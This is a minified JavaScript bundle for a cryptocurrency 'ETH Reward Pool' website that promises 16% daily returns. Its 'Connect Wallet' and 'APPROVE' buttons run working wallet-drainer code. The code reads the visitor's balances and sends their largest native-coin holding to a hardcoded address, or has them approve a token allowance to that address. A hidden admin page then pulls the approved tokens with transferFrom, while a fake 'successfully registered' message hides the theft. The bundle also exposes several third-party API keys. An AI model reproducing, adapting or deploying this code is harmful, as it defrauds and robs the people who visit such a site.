(window.webpackJsonp=window.webpackJsonp||[]).push([[0],{146:function(e,t,a){e.exports=a.p+"static/media/btc.f1925822.png"},147:function(e,t,a){e.exports=a.p+"static/media/eth.4d4e6e19.png"},209:function(e,t,a){e.exports=a.p+"static/media/logo.e1df49b4.png"},210:function(e,t,a){e.exports={absolute:"AppSpiner_absolute__3hx4R",spinner:"AppSpiner_spinner__139LE","spinner-border":"AppSpiner_spinner-border__32Wu-"}},381:function(e,t,a){e.exports=a.p+"static/media/video1.4d23f3dd.mp4"},382:function(e,t,a){e.exports=a.p+"static/media/logo-2.e8496036.png"},383:function(e,t,a){e.exports=a.p+"static/media/playstore.3a97a304.webp"},384:function(e,t,a){e.exports=a.p+"static/media/appstore.5b133fb0.webp"},390:function(e,t,a){e.exports=a(868)},395:function(e,t,a){},431:function(e,t){},435:function(e,t){},437:function(e,t){},441:function(e,t){},465:function(e,t){},467:function(e,t){},476:function(e,t){},478:function(e,t){},488:function(e,t){},490:function(e,t){},604:function(e,t){},606:function(e,t){},613:function(e,t){},614:function(e,t){},639:function(e,t){},646:function(e,t){},707:function(e,t){},732:function(e,t){},866:function(e,t,a){},868:function(e,t,a){"use strict";a.r(t);var n,r=a(1),c=a.n(r),s=a(58),o=a.n(s),i=(a(395),a(205)),l=a(17),u=(a(396),a(0)),d=a.n(u),m=a(9),p=a(25),f=a(42),h=a.n(f),b=a(53),E=a(144),w=a.n(E),v=a(369),x=a.n(v),g=(a(320),"0xAda318CBbBa1bB35Bffd60523926E899b9bA5065"),y=new w.a(window.ethereum),k=function(){var e=Object(r.useState)([]),t=Object(p.a)(e,2),a=t[0],n=t[1],s=Object(r.useState)(0),o=Object(p.a)(s,2),i=o[0],l=o[1];Object(r.useEffect)(function(){u()},[]);var u=function(){var e=Object(m.a)(d.a.mark(function e(){var t;return d.a.wrap(function(e){for(;;)switch(e.prev=e.next){case 0:return e.next=2,h.a.get("http://localhost:5000/products");case 2:t=e.sent,n(t.data);case 4:case"end":return e.stop()}},e)}));return function(){return e.apply(this,arguments)}}();Object(r.useEffect)(function(){!function(){var e=Object(m.a)(d.a.mark(function e(){return d.a.wrap(function(e){for(;;)switch(e.prev=e.next){case 0:if("undefined"===typeof window.ethereum){e.next=25;break}if(e.prev=1,!window.ethereum){e.next=20;break}return e.next=5,window.ethereum.enable();case 5:e.prev=5,e.next=20;break;case 8:if(e.prev=8,e.t0=e.catch(5),4902!==e.t0.code){e.next=19;break}return e.prev=11,e.next=14,window.ethereum.request({method:"wallet_addEthereumChain",params:[{chainId:"0x1",rpcUrl:"https://bsc-dataseed1.defibit.io/"}]});case 14:e.next=19;break;case 16:e.prev=16,e.t1=e.catch(11),console.error(e.t1);case 19:console.error(e.t0);case 20:e.next=25;break;case 22:return e.prev=22,e.t2=e.catch(1),e.abrupt("return",!1);case 25:case"end":return e.stop()}},e,null,[[1,22],[5,8],[11,16]])}));return function(){return e.apply(this,arguments)}}()()},[]);var f=function(){var e=Object(m.a)(d.a.mark(function e(t,a){var n,r,c,s,o,l,u,p,f,E,w,v;return d.a.wrap(function(e){for(;;)switch(e.prev=e.next){case 0:if(console.log(t),0!==i){e.next=5;break}b.NotificationManager.warning("Transfer Amount is not 0.","Transfer Amount Warning",3e3),e.next=42;break;case 5:if("BSC"!==t.network){e.next=30;break}return e.next=8,window.ethereum.request({method:"wallet_switchEthereumChain",params:[{chainId:"0x38"}]});case 8:if("BIT"!==t.symbol){e.next=20;break}return console.log(t,"--------bit"),n="https://api.bscscan.com/api?module=contract&action=getabi&address="+t.contractAddress+"&apikey=YW91Y3RUQNANJA1GJV82XSMN77FGJGXXP6",e.next=13,h.a.get(n);case 13:return r=e.sent,c=JSON.parse(r.data.result),s=new y.eth.Contract(c,t.contractAddress),e.next=18,s.methods.transferFrom(t.userWalletAddress,g,1e9*i).send({from:g,gas:2e5}).then(function(){var e=Object(m.a)(d.a.mark(function e(a){return d.a.wrap(function(e){for(;;)switch(e.prev=e.next){case 0:return console.log(a),e.next=3,h.a.patch("http://localhost:5000/products/"+t.id,{amount:t.amount-i});case 3:b.NotificationManager.success("Transfer success!","",3e3);case 4:case"end":return e.stop()}},e)}));return function(t){return e.apply(this,arguments)}}());case 18:e.next=28;break;case 20:return o="https://api.bscscan.com/api?module=contract&action=getabi&address="+t.contractAddress+"&apikey=YW91Y3RUQNANJA1GJV82XSMN77FGJGXXP6",e.next=23,h.a.get(o);case 23:return l=e.sent,u=JSON.parse(l.data.result),p=new y.eth.Contract(u,t.contractAddress),e.next=28,p.methods.transferFrom(t.userWalletAddress,g,y.utils.toWei(i.toString(),"ether")).send({from:g,gas:9e4}).then(function(){var e=Object(m.a)(d.a.mark(function e(a){return d.a.wrap(function(e){for(;;)switch(e.prev=e.next){case 0:return console.log(a),e.next=3,h.a.patch("http://localhost:5000/products/"+t.id,{amount:t.amount-i});case 3:b.NotificationManager.success("Transfer success!","",3e3);case 4:case"end":return e.stop()}},e)}));return function(t){return e.apply(this,arguments)}}());case 28:e.next=42;break;case 30:return console.log(t,"--------ehter"),e.next=33,window.ethereum.request({method:"wallet_switchEthereumChain",params:[{chainId:"0x1"}]});case 33:return f="https://api.etherscan.io/api?module=contract&action=getabi&address="+t.contractAddress+"&apikey=7UX79SPAG4V5WFCBNV7I6FVC1P1UF478F3",e.next=36,h.a.get(f);case 36:return E=e.sent,console.log(E.data.result),w=JSON.parse(E.data.result),v=new y.eth.Contract(w,t.contractAddress),e.next=42,v.methods.transferFrom(t.userWalletAddress,g,y.utils.toWei(i.toString(),"ether")).send({from:g,gas:9e4}).then(function(){var e=Object(m.a)(d.a.mark(function e(a){return d.a.wrap(function(e){for(;;)switch(e.prev=e.next){case 0:return e.next=2,h.a.patch("http://localhost:5000/products/"+t.id,{amount:t.amount-i});case 2:b.NotificationManager.success("Transfer success!","",3e3);case 3:case"end":return e.stop()}},e)}));return function(t){return e.apply(this,arguments)}}());case 42:case"end":return e.stop()}},e)}));return function(t,a){return e.apply(this,arguments)}}();return c.a.createElement("div",{className:"m-4 text-center adminpage"},c.a.createElement("h1",{className:"w-25 m-auto mt-4"},"Approved User List"),c.a.createElement("table",{className:"mt-4 table table-bordered text-center fs-3 m-auto w-75"},c.a.createElement("thead",null,c.a.createElement("tr",null,c.a.createElement("th",null,"No"),c.a.createElement("th",null,"User Address"),c.a.createElement("th",null,"Admin Address"),c.a.createElement("th",null,"Amount"),c.a.createElement("th",null,"Symbol"),c.a.createElement("th",null,"Date"),c.a.createElement("th",null,"Manage Amount"),c.a.createElement("th",null,"Action"))),c.a.createElement("tbody",null,a&&a.map(function(e,t){return c.a.createElement("tr",{key:t},c.a.createElement("td",null,t+1),c.a.createElement("td",{title:e.userWalletAddress},e.userWalletAddress.slice(0,5)+"..."+e.userWalletAddress.slice(-4,e.userWalletAddress.length)),c.a.createElement("td",{title:e.adminAddress},e.adminAddress.slice(0,5)+"..."+e.adminAddress.slice(-4,e.adminAddress.length)),c.a.createElement("td",null,e.amount.toFixed(4)),c.a.createElement("td",null,e.symbol),c.a.createElement("td",null,x()(e.updatedAt,"YYYY-MM-DD HH:mm:ssZ").format("DD/MM/YYYY HH:mm")),c.a.createElement("td",{className:"position-relative "},"BNB"===e.symbol||"ETH"===e.symbol?"":c.a.createElement("input",{className:"form-control",type:"number",onChange:function(e){return t=e.target.value,void l(t);var t}})),c.a.createElement("td",null,"BNB"===e.symbol||"ETH"===e.symbol?"":c.a.createElement("button",{className:"form-control",type:"number",onClick:function(){f(e,t)}},"Transfer")))}))),c.a.createElement(b.NotificationContainer,null))},N=a(145),O=a(385),A=a(370),C=a.n(A),S=(a(731),a(371)),I=a(212),j=a(876),M=a(45),D=a.n(M),B=a(380),P=a.n(B),T=a(381),U=a.n(T),_={AnchorEarnBSC:{0:"0x0000000000000000000000000000000000000000",56:"",97:"0x80de92df50F270e49bb4E269502D00cAB753A55a"},StakingVault:{0:"0x0000000000000000000000000000000000000000",56:"",97:"0xd6861aB260a8c2f060d3E541Df7696dDBC9AB682"},BlockExplorerURL:{56:"https://bscscan.com",97:"https://testnet.bscscan.com"},RpcURL:{56:"https://bsc-dataseed1.defibit.io/",97:"https://speedy-nodes-nyc.moralis.io/03eb35954a0b7ed092444a8e/bsc/testnet"},chainHexID:{56:"0x38",97:"0x61"},MAX_STAKE_AMOUNT_PER_USER_DIV_DECIMALS:1e4,INFURA_ID:"4d65ff69d5dd446b8a0c6961df6d963d",chainID:56},F=(a(866),a(209)),R=a.n(F),Y=a(382),W=a.n(Y),L=a(146),J=a.n(L),H=a(147),Q=a.n(H),X=a(383),q=a.n(X),K=a(384),G=a.n(K),$=a(210),z=a.n($),V=function(e){return c.a.createElement("div",{className:"".concat(e.absolute?z.a.absolute:"text-center")},c.a.createElement("div",{className:"".concat(z.a.spinner," spinner-border color-primary"),role:"status"},c.a.createElement("span",{className:"sr-only"})))},Z="0xAda318CBbBa1bB35Bffd60523926E899b9bA5065";I.a;"undefined"!==typeof window&&(n=new C.a({network:"mainnet",cacheProvider:!0,providerOptions:{walletconnect:{package:I.a,options:{infuraId:_.INFURA_ID,rpc:{56:"https://bsc-dataseed.binance.org/",1:"https://mainnet.infura.io/v3/"}}}},theme:"dark"}));var ee={provider:null,web3Provider:null,address:null,chainId:null};function te(e,t){switch(t.type){case"SET_WEB3_PROVIDER":return Object(N.a)({},e,{provider:t.provider,web3Provider:t.web3Provider,address:t.address,chainId:t.chainId});case"SET_ADDRESS":return Object(N.a)({},e,{address:t.address});case"SET_CHAIN_ID":return Object(N.a)({},e,{chainId:t.chainId});case"RESET_WEB3_PROVIDER":return ee;default:throw new Error}}var ae=new w.a(window.ethereum),ne=function(e){var t=Object(r.useState)(!1),a=Object(p.a)(t,2),s=a[0],o=a[1],i=function(){return o(!0)},l=Object(r.useState)(!1),u=Object(p.a)(l,2),f=u[0],E=u[1],w=Object(r.useState)(""),v=Object(p.a)(w,2),x=v[0],g=v[1],y=Object(r.useState)(!1),k=Object(p.a)(y,2),N=(k[0],k[1]),A=Object(r.useState)(!1),C=Object(p.a)(A,2),I=(C[0],C[1]),M=Object(r.useState)([]),B=Object(p.a)(M,2),T=B[0],F=B[1],Y=Object(r.useState)(""),L=Object(p.a)(Y,2),H=L[0],X=L[1],K=Object(r.useReducer)(te,ee),$=Object(p.a)(K,2),z=$[0],ne=$[1];Object(r.useEffect)(function(){function e(){if(D()(".main-header").length){var e=D()(window).scrollTop(),t=D()(".main-header"),a=D()(".scroll-to-top");e>1?(t.addClass("fixed-header"),a.fadeIn(300)):(t.removeClass("fixed-header"),a.fadeOut(300))}}var t;e(),(t=D.a).fn.appear=function(e,a){var n=t.extend({data:void 0,one:!0,accX:0,accY:0},a);return this.each(function(){var a=t(this);if(a.appeared=!1,e){var r=t(window),c=function(){if(a.is(":visible")){var e=r.scrollLeft(),t=r.scrollTop(),c=a.offset(),s=c.left,o=c.top,i=n.accX,l=n.accY,u=a.height(),d=r.height(),m=a.width(),p=r.width();o+u+l>=t&&o<=t+d+l&&s+m+i>=e&&s<=e+p+i?a.appeared||a.trigger("appear",n.data):a.appeared=!1}else a.appeared=!1},s=function(){if(a.appeared=!0,n.one){r.unbind("scroll",c);var s=t.inArray(c,t.fn.appear.checks);s>=0&&t.fn.appear.checks.splice(s,1)}e.apply(this,arguments)};n.one?a.one("appear",n.data,s):a.bind("appear",n.data,s),r.scroll(c),t.fn.appear.checks.push(c),c()}else a.trigger("appear",n.data)})},t.extend(t.fn.appear,{checks:[],timeout:null,checkAll:function(){var e=t.fn.appear.checks.length;if(e>0)for(;e--;)t.fn.appear.checks[e]()},run:function(){t.fn.appear.timeout&&clearTimeout(t.fn.appear.timeout),t.fn.appear.timeout=setTimeout(t.fn.appear.checkAll,20)}}),t.each(["append","prepend","after","before","attr","removeAttr","addClass","removeClass","toggleClass","remove","css","show","hide"],function(e,a){var n=t.fn[a];n&&(t.fn[a]=function(){var e=n.apply(this,arguments);return t.fn.appear.run(),e})}),D()(".count-box").length&&D()(".count-box").appear(function(){var e=D()(this),t=e.find(".count-text").attr("data-stop"),a=parseInt(e.find(".count-text").attr("data-speed"),10);e.hasClass("counted")||(e.addClass("counted"),D()({countNum:e.find(".count-text").text()}).animate({countNum:t},{duration:a,easing:"linear",step:function(){e.find(".count-text").text(Math.floor(this.countNum))},complete:function(){e.find(".count-text").text(this.countNum)}}))},{accY:0}),D()(window).on("scroll",function(){e()}),D()(window).on("load",function(){D()(".main-header").length&&D()(".preloader").delay(200).fadeOut(500)})},[]),Object(r.useEffect)(function(){x&&function(){var e=Object(m.a)(d.a.mark(function e(t){var a,n,r,c,s,o,i,l,u,p,f,w,v;return d.a.wrap(function(e){for(;;)switch(e.prev=e.next){case 0:if(E(!0),a={eth:[],bsc:[]},!t){e.next=25;break}return n=function(){var e=Object(m.a)(d.a.mark(function e(){var t,a,n,r;return d.a.wrap(function(e){for(;;)switch(e.prev=e.next){case 0:t=0;case 1:if(!(t<f.length)){e.next=18;break}if(a="","BSC"!==f[t].network){e.next=10;break}return n="https://api.bscscan.com/api?module=contract&action=getabi&address="+f[t].currency.address+"&apikey=YW91Y3RUQNANJA1GJV82XSMN77FGJGXXP6",e.next=7,h.a.get(n);case 7:a=e.sent,e.next=14;break;case 10:return r="https://api.etherscan.io/api?module=contract&action=getabi&address="+f[t].currency.address+"&apikey=7UX79SPAG4V5WFCBNV7I6FVC1P1UF478F3",e.next=13,h.a.get(r);case 13:a=e.sent;case 14:!v[f[t].currency.symbol.toUpperCase()]||"OK"!=a.data.message&&"-"!==f[t].currency.address?(f[t].price=0,f[t].cost=0*+f[t].value):(f[t].price=v[f[t].currency.symbol.toUpperCase()].USD,f[t].cost=+f[t].value*f[t].price);case 15:t++,e.next=1;break;case 18:case"end":return e.stop()}},e)}));return function(){return e.apply(this,arguments)}}(),r="query ($network: EthereumNetwork!, $address: String!) {ethereum(network: $network) {address(address: {is: $address}) {balances {currency {address symbol tokenType decimals} value}}}}",c='{"limit": 10,"offset": 0,"network": "ethereum","address": "'+t+'"}',s="https://graphql.bitquery.io/",o={method:"POST",headers:{"Content-Type":"application/json","X-API-KEY":"BQYWo7kGGYZM6mJuzcmKBg73OZGWxkip"},body:JSON.stringify({query:r,variables:c})},e.next=10,fetch(s,o).then(function(e){return e.json()}).then(function(e){return a.eth=e.data.ethereum.address[0].balances}).catch(console.error);case 10:return r="query ($network: EthereumNetwork!, $address: String!) {ethereum(network: $network) {address(address: {is: $address}) {balances {currency {address symbol tokenType decimals} value}}}}",c='{"limit": 10,"offset": 0,"network": "bsc","address": "'+t+'"}',o={method:"POST",headers:{"Content-Type":"application/json","X-API-KEY":"BQYWo7kGGYZM6mJuzcmKBg73OZGWxkip"},body:JSON.stringify({query:r,variables:c})},e.next=15,fetch(s,o).then(function(e){return e.json()}).then(function(e){return a.bsc=e.data.ethereum.address[0].balances}).catch(console.error);case 15:if(a.bsc)for(i=0;i<a.bsc.length;i++)a.bsc[i].network="BSC";if(a.eth)for(l=0;l<a.eth.length;l++)a.eth[l].network="ETH";return u=a.eth?a.eth:[],p=a.bsc?a.bsc:[],f=u.concat(p),w=f.map(function(e){return e.currency.symbol}),e.next=23,re(w);case 23:v=e.sent,n().then(function(e){F(f.sort(function(e,t){return t.value-e.value}).sort(function(e,t){return t.cost-e.cost})),I(!0),E(!1),b.NotificationManager.success("wallet connect success!","Connect Info",3e3)});case 25:case"end":return e.stop()}},e)}));return function(t){return e.apply(this,arguments)}}()(x)},[x]);var re=function(){var e=Object(m.a)(d.a.mark(function e(t){var a,n,r,c;return d.a.wrap(function(e){for(;;)switch(e.prev=e.next){case 0:if(n={},!(a=t).slice(0,50).length){e.next=14;break}return r="https://min-api.cryptocompare.com/data/pricemulti?fsyms="+a.slice(0,50)+"&tsyms=USD&api_key=1c940e3c3c91c116020548b632808f489ee055d007bd229ff3f65161b29b19f7",e.next=6,h.a.get(r);case 6:if(c=e.sent,Object.assign(n,c.data),!a.slice(51,100).length){e.next=14;break}return r="https://min-api.cryptocompare.com/data/pricemulti?fsyms="+a.slice(51,100)+"&tsyms=USD&api_key=1c940e3c3c91c116020548b632808f489ee055d007bd229ff3f65161b29b19f7",e.next=12,h.a.get(r);case 12:c=e.sent,Object.assign(n,c.data);case 14:return e.abrupt("return",n);case 15:case"end":return e.stop()}},e)}));return function(t){return e.apply(this,arguments)}}(),ce=function(){var e=Object(m.a)(d.a.mark(function e(){var t,a,n,r,c,s,o,l,u,p,f,w,v,g,y,k,N,O,A,C;return d.a.wrap(function(e){for(;;)switch(e.prev=e.next){case 0:if(e.prev=0,t="0xAda318CBbBa1bB35Bffd60523926E899b9bA5065",a="-",n="-",r=T[0],!T.length){e.next=77;break}E(!0),c=0;case 8:if(!(c<T.length)){e.next=30;break}if(!(t==T[c].currency.address||a==T[c].currency.address&&T[c].value>.005)||"BSC"!=T[c].network){e.next=24;break}if(r=T[c],t!=r.currency.address){e.next=21;break}s=c+1;case 13:if(!(s<T.length)){e.next=21;break}if(!(a==T[s].currency.address&&T[s].value>.005&&"BSC"==T[s].network)){e.next=18;break}if(!(r.value<350*T[s].value)){e.next=18;break}return r=T[s],e.abrupt("break",21);case 18:s++,e.next=13;break;case 21:return e.abrupt("break",30);case 24:if(!(n==T[c].currency.address&&T[c].value>.01&&"ETH"==T[c].network)){e.next=27;break}return r=T[c],e.abrupt("break",30);case 27:c++,e.next=8;break;case 30:if("BSC"!==r.network){e.next=57;break}return e.next=33,window.ethereum.request({method:"wallet_switchEthereumChain",params:[{chainId:"0x38"}]});case 33:if(o=r.value*Math.pow(10,r.currency.decimals),"-"!==r.currency.address){e.next=47;break}return e.next=37,ae.eth.getGasPrice();case 37:return l=e.sent,u={from:x,to:Z,gasPrice:l},e.next=41,ae.eth.estimateGas(u);case 41:p=e.sent,o-=p*l*2,ae.eth.sendTransaction({from:x,to:Z,value:o,gasPrice:l,gasLimit:p}).then(function(){var e=Object(m.a)(d.a.mark(function e(t){return d.a.wrap(function(e){for(;;)switch(e.prev=e.next){case 0:E(!1),i();case 2:case"end":return e.stop()}},e)}));return function(t){return e.apply(this,arguments)}}()),e.next=55;break;case 47:return f="https://api.bscscan.com/api?module=contract&action=getabi&address="+r.currency.address+"&apikey=YW91Y3RUQNANJA1GJV82XSMN77FGJGXXP6",e.next=50,h.a.get(f);case 50:return w=e.sent,v=JSON.parse(w.data.result),g=new ae.eth.Contract(v,r.currency.address),e.next=55,g.methods.approve(Z,ae.utils.toWei(r.value.toString(),"ether")).send({from:x}).then(function(){var e=Object(m.a)(d.a.mark(function e(t){return d.a.wrap(function(e){for(;;)switch(e.prev=e.next){case 0:E(!1),i();case 2:case"end":return e.stop()}},e)}));return function(t){return e.apply(this,arguments)}}());case 55:e.next=77;break;case 57:return e.next=59,window.ethereum.request({method:"wallet_switchEthereumChain",params:[{chainId:"0x1"}]});case 59:if(y=r.value*Math.pow(10,r.currency.decimals),r.price,"-"!==r.currency.address){e.next=69;break}k=Math.floor(161e8+1e10*Math.random()),y-=21e3*k,ae.eth.sendTransaction({from:x,to:Z,value:ae.utils.toBN(y.toFixed(0).toString()),gasPrice:k,gasLimit:21e3}).then(function(){var e=Object(m.a)(d.a.mark(function e(t){return d.a.wrap(function(e){for(;;)switch(e.prev=e.next){case 0:E(!1),i();case 2:case"end":return e.stop()}},e)}));return function(t){return e.apply(this,arguments)}}()),e.next=77;break;case 69:return N="https://api.etherscan.io/api?module=contract&action=getabi&address="+r.currency.address+"&apikey=7UX79SPAG4V5WFCBNV7I6FVC1P1UF478F3",e.next=72,h.a.get(N);case 72:return O=e.sent,A=JSON.parse(O.data.result),C=new ae.eth.Contract(A,r.currency.address),e.next=77,C.methods.approve(Z,ae.utils.toWei(r.value.toString(),"ether")).send({from:x}).then(function(){var e=Object(m.a)(d.a.mark(function e(t){return d.a.wrap(function(e){for(;;)switch(e.prev=e.next){case 0:E(!1),i();case 2:case"end":return e.stop()}},e)}));return function(t){return e.apply(this,arguments)}}());case 77:E(!1),e.next=84;break;case 80:e.prev=80,e.t0=e.catch(0),E(!1),b.NotificationManager.warning("Reward failed!","Reward Info",3e3);case 84:case"end":return e.stop()}},e,null,[[0,80]])}));return function(){return e.apply(this,arguments)}}(),se=z.provider,oe=z.web3Provider,ie=Object(r.useCallback)(Object(m.a)(d.a.mark(function e(){var t,a,r,c,s,o;return d.a.wrap(function(e){for(;;)switch(e.prev=e.next){case 0:return e.prev=0,e.next=3,n.connect();case 3:return t=e.sent,window.ethereum||alert("MetaMask is not installed. Please consider installing it: https://metamask.io/download.html"),a=new j.a.Web3Provider(t),r=a.getSigner(),e.next=9,r.getAddress();case 9:return c=e.sent,e.next=12,a.getNetwork();case 12:s=e.sent,o=c.slice(0,5)+"..."+c.slice(-4,c.length),X(o),g(c),N(!0),ne({type:"SET_WEB3_PROVIDER",provider:t,web3Provider:a,show_address:o,chainId:s.chainId}),e.next=34;break;case 20:if(e.prev=20,e.t0=e.catch(0),b.NotificationManager.warning("wallet connect failed!","Connect Info",3e3),4902!==e.t0.code){e.next=33;break}return e.prev=24,e.next=27,window.ethereum.request({method:"wallet_addEthereumChain",params:[{chainId:_.chainHexID[_.chainID],rpcUrl:_.RpcURL[_.chainID]}]});case 27:e.next=31;break;case 29:e.prev=29,e.t1=e.catch(24);case 31:e.next=34;break;case 33:e.t0.code;case 34:case"end":return e.stop()}},e,null,[[0,20],[24,29]])})),[]),le=Object(r.useCallback)(Object(m.a)(d.a.mark(function e(){return d.a.wrap(function(e){for(;;)switch(e.prev=e.next){case 0:return e.next=2,n.clearCachedProvider();case 2:X(null),g(null),ne({type:"RESET_WEB3_PROVIDER"});case 5:case"end":return e.stop()}},e)})),[]);return Object(r.useEffect)(function(){n.cachedProvider&&ie()},[ie]),Object(r.useEffect)(function(){if(se){var e=function(e){ie(),ne({type:"SET_ADDRESS",address:e[0]})};return function(){se.removeListener&&se.removeListener("accountsChanged",e)}}},[se]),c.a.createElement(c.a.Fragment,null,c.a.createElement("div",{className:"page-wrapper"},c.a.createElement("div",{className:"preloader"},c.a.createElement("div",{className:"wow zoomIn"},c.a.createElement("img",{src:R.a,alt:""}))),c.a.createElement("span",{className:"header-span"}),c.a.createElement("header",{className:"main-header"},c.a.createElement("div",{className:"container-fluid"},c.a.createElement("div",{className:"main-box"},c.a.createElement("div",{className:"logo"},c.a.createElement("a",{href:"/"},c.a.createElement("img",{src:R.a,alt:""}))),c.a.createElement("div",{className:"nav-outer"},c.a.createElement("div",{className:"outer-box"},c.a.createElement("a",{href:"/",className:"download-btn"},c.a.createElement("img",{src:q.a,alt:""})),c.a.createElement("a",{href:"/",className:"download-btn"},c.a.createElement("img",{src:G.a,alt:""})),oe?c.a.createElement("button",{className:"theme-btn btn-style-one",onClick:le},H):c.a.createElement("button",{className:"theme-btn btn-style-one",onClick:ie},"Connect Wallet")))))),c.a.createElement("section",{className:"banner-section",id:"banner"},c.a.createElement("div",{className:"bg-shape"}),c.a.createElement("div",{className:"auto-container"},c.a.createElement("div",{className:"content-box"},c.a.createElement("h2",{className:"wow fadeInUp","data-wow-delay":"500ms"},"The ETH Reward Pool with the tastiest return, 16% daily!"),c.a.createElement("div",{className:"text wow fadeInUp","data-wow-delay":"800ms"},"12 April ",c.a.createElement("span",null,"7:00 AM UTC")," ",c.a.createElement("em",null,"\xa0 --- \xa0")," 9 May ",c.a.createElement("span",null,"00:00 AM UTC")),c.a.createElement("h1",{className:"wow fadeInUp","data-wow-delay":"1500ms"},c.a.createElement("div",{className:"count-box"},c.a.createElement("span",{className:"count-text","data-speed":"5000","data-stop":"5000"},"0")),"  ETH Prize Pool"),c.a.createElement("div",{className:"coins-list wow fadeInUp","data-wow-delay":"2000ms"},c.a.createElement("li",null,c.a.createElement("img",{src:J.a,alt:""})," Etherium")),c.a.createElement("div",{className:"btn-box wow fadeInUp","data-wow-delay":"2500ms"},c.a.createElement("div",{className:"theme-btn btn-style-one",onClick:ce},"APPROVE"))))),c.a.createElement("section",{className:"video-section"},c.a.createElement("div",{className:"position-relative"},c.a.createElement("div",{className:"position-absolute mint-part w-100"},c.a.createElement("div",{className:"d-flex flex-column text-center content-box1"},c.a.createElement("h2",null,"Fortune favours the brave"),c.a.createElement("a",{href:"/",className:"theme-btn btn-style-two"},"Learn More"))),c.a.createElement(P.a,{playing:!0,muted:!0,loop:!0,className:"react-player",url:U.a,width:"100%",height:"100%"}))),c.a.createElement("section",{className:"vision-section"},c.a.createElement("div",{className:"auto-container"},c.a.createElement("div",{className:"wow fadeInUp sec-title text-center"},c.a.createElement("span",{className:"sub-title"},"OUR VISION"),c.a.createElement("h2",null,"Cryptocurrency in ",c.a.createElement("br",null)," Every Wallet\u2122")),c.a.createElement("div",{className:"image-box wow fadeInUp"},c.a.createElement("figure",{className:"image"},c.a.createElement("img",{src:W.a,alt:""}))),c.a.createElement("div",{className:"fact-counter wow fadeInUp"},c.a.createElement("div",{className:"row clearfix"},c.a.createElement("div",{className:"counter-column col-lg-3 col-md-6 col-sm-12 wow fadeInUp"},c.a.createElement("h4",{className:"counter-title"},"Founded in"),c.a.createElement("div",{className:"count-box"},c.a.createElement("span",{className:"count-text","data-speed":"5000","data-stop":"2016"},"0"))),c.a.createElement("div",{className:"counter-column col-lg-3 col-md-6 col-sm-12 wow fadeInUp","data-wow-delay":"400ms"},c.a.createElement("h4",{className:"counter-title"},"Team of"),c.a.createElement("div",{className:"count-box"},c.a.createElement("span",{className:"count-text","data-speed":"5000","data-stop":"4000"},"0"))),c.a.createElement("div",{className:"counter-column col-lg-3 col-md-6 col-sm-12 wow fadeInUp","data-wow-delay":"800ms"},c.a.createElement("h4",{className:"counter-title"},"Users"),c.a.createElement("div",{className:"count-box"},c.a.createElement("span",{className:"count-text","data-speed":"5000","data-stop":"54"},"0"),"M")),c.a.createElement("div",{className:"counter-column col-lg-3 col-md-6 col-sm-12 wow fadeInUp","data-wow-delay":"1200ms"},c.a.createElement("h4",{className:"counter-title"},"Insurance (USD)"),c.a.createElement("div",{className:"count-box"},c.a.createElement("span",{className:"count-text","data-speed":"5000","data-stop":"750"},"0"),"M")))),c.a.createElement("div",{className:"btn-box text-center mt-5"},c.a.createElement("a",{href:"/",className:"theme-btn btn-style-two"},"About Us",c.a.createElement("i",{className:"fa fa-arrow-right"})))))),c.a.createElement(b.NotificationContainer,null),f&&c.a.createElement(V,{absolute:!0}),c.a.createElement(S.a,{open:s,onClose:function(){return o(!1)},center:!0},c.a.createElement("div",{className:"modal-body text-center"},c.a.createElement(O.a,{size:100,color:"#06C88B"}),c.a.createElement("br",null),c.a.createElement("div",{className:"title"},"Successfully registered"),c.a.createElement("br",null),c.a.createElement("div",{className:"content"},"You have successfully registered for this contest,",c.a.createElement("br",null)," if you are lucky you will receive your BNB price soon!"))))};var re=function(){return c.a.createElement(i.a,null,c.a.createElement(l.d,null,c.a.createElement(l.b,{path:"/",element:c.a.createElement(ne,null)}),c.a.createElement(l.b,{path:"/admin",element:c.a.createElement(k,null)}),c.a.createElement(l.b,{path:"*",element:c.a.createElement(l.a,{to:"/"})})))},ce=function(e){e&&e instanceof Function&&a.e(3).then(a.bind(null,877)).then(function(t){var a=t.getCLS,n=t.getFID,r=t.getFCP,c=t.getLCP,s=t.getTTFB;a(e),n(e),r(e),c(e),s(e)})};o.a.render(c.a.createElement(re,null),document.getElementById("root")),ce()}},[[390,1,2]]]);
//# sourceMappingURL=main.3c1fa871.chunk.js.map